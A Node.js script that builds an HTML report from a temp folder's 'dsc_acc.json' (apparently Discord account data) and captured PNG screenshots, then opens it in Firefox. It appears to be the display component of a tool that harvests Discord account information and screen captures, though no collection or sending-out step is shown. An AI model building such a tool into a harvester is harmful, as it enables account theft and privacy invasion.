const { join } = require('path');
const { writeFileSync, readFileSync, readdirSync } = require('fs');
const { tempFolder } = require('../index');
const { execSync } = require('child_process');
const { addDoubleQuotes } = require('../util/string');

const setVariable = (variable, value) => html = html.replaceAll(`%${variable}%`, value);
const asset = (asset) => readFileSync(join(__dirname, '..', 'assets', asset)).toString();
let html = readFileSync(join(__dirname, '..', 'assets', 'info.html')).toString();
setVariable('JS_SCRIPT', asset('info.js').replaceAll('\'%DISCORD_INFO_JSON%\'', readFileSync(join(tempFolder, 'dsc_acc.json')).toString()));
setVariable('BOOTSTRAP', readFileSync(join(__dirname, '..', 'node_modules', 'bootstrap', 'dist', 'js', 'bootstrap.bundle.min.js')).toString());
setVariable('CSS_STYLE', readFileSync(join(__dirname, '..', 'node_modules', 'bootstrap', 'dist', 'css', 'bootstrap.min.css')).toString());
setVariable('SCREENSHOTS_LIST', readdirSync(tempFolder).filter(f => f.split('.').pop() === 'png').map(i => {
  const imgUrl = 'data:image/png;base64,' + readFileSync(join(tempFolder, i), { encoding: 'base64' });
  return `<img src="${imgUrl}" class="col" alt="${i.replace(`.${i.split('.').pop()}`, '')}" />`;
}).join(''));

writeFileSync(join(tempFolder, 'Info.html'), html);
execSync('"C:\\Program Files\\Mozilla Firefox\\firefox.exe" ' + addDoubleQuotes(join(tempFolder, 'Info.html')));
